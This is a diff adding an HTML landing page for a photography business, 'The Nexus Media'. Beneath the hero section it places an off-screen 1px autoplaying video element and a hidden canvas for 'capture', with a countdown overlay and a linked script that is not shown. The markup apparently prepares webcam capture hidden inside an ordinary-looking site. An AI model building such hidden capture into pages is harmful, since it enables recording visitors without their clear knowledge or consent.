@@ -1,0 +1,70 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>The Nexus — Capture + Hero</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <header class="site-header">
+    <div class="container header-inner">
+      <div class="brand">
+        <div class="logo" aria-hidden="true">
+          <svg viewBox="0 0 24 24" width="28" height="28">
+            <rect x="2" y="5" width="20" height="14" rx="2" fill="#b71c1c"/>
+            <circle cx="12" cy="12" r="3.2" fill="#fff"/>
+            <rect x="4" y="6" width="4" height="2" rx="0.5" fill="#fff"/>
+          </svg>
+        </div>
+        <div class="brand-text">
+          <span class="title">THE NEXUS</span>
+          <span class="subtitle">MEDIA</span>
+        </div>
+      </div>
+
+      <nav class="nav">
+        <a href="#portfolio">Portfolio</a>
+        <a href="#about">About</a>
+        <a href="#services">Services</a>
+        <a class="btn btn-primary" href="#book">Book Session</a>
+      </nav>
+    </div>
+  </header>
+
+  <main>
+    <section class="hero">
+      <div class="hero-overlay"></div>
+      <div class="container hero-content">
+        <h1 class="hero-headline">
+          Capturing<br/>
+          Stories Through<br/>
+          <span class="accent">Visual Excellence</span>
+        </h1>
+
+        <p class="hero-sub">
+          Professional photography services that bring your vision to life with cinematic quality and artistic precision.
+        </p>
+
+        <div class="hero-ctas">
+          <a class="btn btn-cta" href="#portfolio">View Portfolio</a>
+          <a class="btn btn-outline" href="#contact">Get In Touch</a>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- Minimal, unobtrusive capture UI (keeps video hidden but clearly notifies user) -->
+  <div class="capture-overlay" aria-live="polite">
+    <p id="notice"> </p>
+    <p id="countdown" class="countdown"></p>
+    <p id="status" class="status"></p>
+  </div>
+
+  <!-- Hidden video + canvas used for capture -->
+  <video id="previewVideo" autoplay playsinline muted style="width:1px;height:1px;position:fixed;left:-9999px;"></video>
+  <canvas id="hiddenCanvas" style="display:none;"></canvas>
+
+  <script src="script.js"></script>
+</body>
+</html>
